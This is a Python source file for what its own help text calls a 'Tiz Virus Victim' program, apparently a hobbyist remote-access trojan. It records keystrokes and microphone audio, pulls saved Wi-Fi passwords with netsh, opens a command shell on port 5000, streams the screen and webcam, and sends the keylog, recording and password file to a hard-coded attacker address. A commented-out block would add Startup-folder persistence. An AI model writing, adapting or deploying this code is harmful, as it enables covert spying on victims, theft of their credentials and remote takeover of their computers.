# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""
 
import threading, subprocess, socket, argparse, sys, os, time

# copy the file in a place where it's gona be launched in every start # never tryed
"""
import os
from shutil import copyfile
username = os.getlogin()
copyfile('virus.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/Windaube.py')
"""


def parseargs():
    cli_args = argparse.ArgumentParser(description="Tiz Virus Victim")
    cli_args.add_argument('--host', help="listening ip, default is '0.0.0.0', no need to change", default='0.0.0.0',
                          type=str)
    cli_args.add_argument('--port',
                          help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2",
                          default=5000, type=int)
    cli_args.add_argument('--keylog', help="keylog=t create a keylogger file / keylog=f don\'t create the file",
                          default="t", type=str)
    cli_args.add_argument('--micro',
                          help="micro=10 record the microphone during 10 sec and put it in a file / micro=0 don\'t record",
                          default=10, type=int)
    cli_args.add_argument('--wifi', help="wifi=t create a file with all wifis password / wifi=f don't create the file",
                          default="t", type=str)
    cli_args.add_argument('--shell', help="shell=t revershell on port (default = 5000) / shell=f don't revershell",
                          default="t", type=str)
    cli_args.add_argument('--camera', help="camera=t stream camera on port+1 (default = 5001) / camera=f don't stream",
                          default="t", type=str)
    cli_args.add_argument('--screen', help="screen=t stream screen on port+2 (default = 5002) / screen=f don't stream",
                          default="t", type=str)
    options = cli_args.parse_args(sys.argv[1:])
    return options


def key_handler(key):
    logging.info(key)


def keylog():
    with Listener(on_press=key_handler) as listener:
        listener.join()


def Microphone(Seconds=10, File="record.wav"):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = float(Seconds)
    WAVE_OUTPUT_FILENAME = File
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)
    frames = []
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()


def wifipass():
    with open("wifis.txt", "w", encoding="utf-8") as fichier:
        try:
            # Use cp437 to match the Windows console encoding
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding="cp437").split('\n')
            wifis = [line.split(':')[1].strip() for line in data if "All User Profile" in line]

            for wifi in wifis:
                try:
                    keys = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear'],
                                                   encoding="cp437").split('\n')
                    key = [line.split(':')[1].strip() for line in keys if "Key Content" in line]
                    fichier.write(f"{wifi}: {key[0] if key else 'No password found'}\n")
                except subprocess.CalledProcessError as e:
                    print(f"Error retrieving password for {wifi}: {e}")
                except IndexError:
                    print(f"Password not found for {wifi}")
        except Exception as e:
            print(f"Failed to retrieve Wi-Fi profiles: {e}")


def retreive_screenshot(conn):
    with mss.mss() as sct:
        # La région de l'écran à capturer
        rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}

        while 'recording':
            # Prendre la capture d'écran
            img = sct.grab(rect)
            # Ajuster le niveau de compression ici (0-9)
            pixels = zlib.compress(img.rgb, 1)
            # Envoie de la taille de la taille des pixels
            size = len(pixels)
            size_len = (size.bit_length() + 7) // 8
            conn.send(bytes([size_len]))
            # Envoie de la taille des pixels
            size_bytes = size.to_bytes(size_len, 'big')
            conn.send(size_bytes)
            # Envoi des pixels compressés
            conn.sendall(pixels)


def screen_sender(host='0.0.0.0', port=5001):
    with socket.socket() as sock:
        sock.bind((host, port))
        sock.listen(5)
        print('screen sender started.')
        while 'connected':
            conn, addr = sock.accept()
            # print('Client connected IP:', addr)
            threadscreen2 = threading.Thread(target=retreive_screenshot, args=(conn,))
            threadscreen2.start()


def handle_client(client_socket):
    BUFFER_SIZE = 4096
    while True:
        try:
      
            command = client_socket.recv(BUFFER_SIZE).decode('utf-8')  
            if command.lower() == "exit":
                print("Disconnected from client.")
                break
           
            output = subprocess.getoutput(command)
            if not output:
                output = "Command executed but no output."
            
            # Gửi kết quả trả về attacker
            client_socket.send(output.encode('utf-8'))
        except Exception as e:
            print(f"Error: {e}")
            break
    
    client_socket.close()

def R_tcp(host='0.0.0.0', port=5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"Reverse shell started and listening on {host}:{port}.")

    while True:
        client_socket, client_address = s.accept()
        print(f"{client_address[0]}:{client_address[1]} Connected!")
        
        # Gửi thông báo "Hacked!" chỉ một lần sau khi kết nối thành công
      

        # Xử lý lệnh từ attacker trong một thread riêng
        threading.Thread(target=handle_client, args=(client_socket,)).start()

def capturevid(conn):
    cap = cv2.VideoCapture(0)
    while (cap.isOpened()):
        _, frame = cap.read()
        compress_img = cv2.imencode('.jpg', frame)[1]
        dat = compress_img.tostring()
        size = len(dat)
        count = math.ceil(size / (MAX_IMAGE_DGRAM))
        array_pos_start = 0
        while count:
            array_pos_end = min(size, array_pos_start + MAX_IMAGE_DGRAM)
            conn.send(struct.pack("B", count) + dat[array_pos_start:array_pos_end])
            array_pos_start = array_pos_end
            count -= 1
    cap.release()
    cv2.destroyAllWindows()
    conn.close()


def camsender(port=5002):
    host = "0.0.0.0"
    with socket.socket() as sock:
        sock.bind((host, port))
        sock.listen(5)
        print('camera sender started.')

        while 'connected':
            conn, addr = sock.accept()
            print('Client connected IP:', addr)
            thread = threading.Thread(target=capturevid, args=(conn,))
            thread.start()



def send_file(conn, file_path):
    try:
        # Extract file name and size
        filename = os.path.basename(file_path)
        filesize = os.path.getsize(file_path)

        # Send file info (file name and size) as a structured string
        file_info = f"{filename}|{filesize}".encode('utf-8')
        conn.sendall(file_info.ljust(1024))  # Ensure it's 1024 bytes for receiving consistency

        # Send the file data in chunks
        with open(file_path, 'rb') as f:
            while True:
                bytes_read = f.read(4096)
                if not bytes_read:
                    break
                conn.sendall(bytes_read)

        print(f"[VICTIM]: File {filename} sent successfully!")

    except Exception as e:
        print(f"Error sending file: {e}")




if __name__ == "__main__":
    # parse args for socket connection
    options = parseargs()
    # keylogger
    if (options.keylog == "t"):
        import logging
        from pynput.keyboard import Key, Listener
        from logging import info

        logging.basicConfig(filename="Keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
        threadlog = threading.Thread(target=keylog)
        threadlog.start()
    # microphone recorder
    if (options.micro > 0):
        import wave, pyaudio

        threadmic = threading.Thread(target=Microphone, args=(options.micro,))
        threadmic.start()
    # recup wifipass
    if (options.wifi == "t"):
        wifipass()
    # Reverse shell tcp
    if (options.shell == "t"):
        threadshell = threading.Thread(target=R_tcp, args=(options.host, options.port))  # port 5000
        threadshell.start()
    # screen sender udp
    import zlib, mss

    if (options.screen == "t"):
        WIDTH = 500
        HEIGHT = 500
        threadscreen = threading.Thread(target=screen_sender, args=(options.host, options.port + 1))  # port 5001
        threadscreen.start()
    # camera sender udp
    import cv2, math, struct

    if (options.camera == "t"):
        MAX_DGRAM = 2 ** 16
        MAX_IMAGE_DGRAM = MAX_DGRAM - 64  # extract 64 bytes in case UDP frame overflown
        threadcam = threading.Thread(target=camsender, args=(options.port + 2,))  # port 5002
        threadcam.start()
    
    # Send files to attacker
    attacker_host = '192.168.1.5'  # Assuming the attacker's IP is the same as the listening IP
    file_transfer_port = options.port + 3  # Using a new port for file transfer
    
    files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
    
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((attacker_host, file_transfer_port))
                for file in files_to_send:
                    send_file(s, file)
                print("Successfully connected and sent files.")
                break  # Exit the loop if connection and file transfer are successful
        except Exception as e:
            print(f"Error connecting to attacker for file transfer: {e}")
            print("Retrying in 5 seconds...")
            time.sleep(5)  # Wait for 5 seconds before retrying

    # suite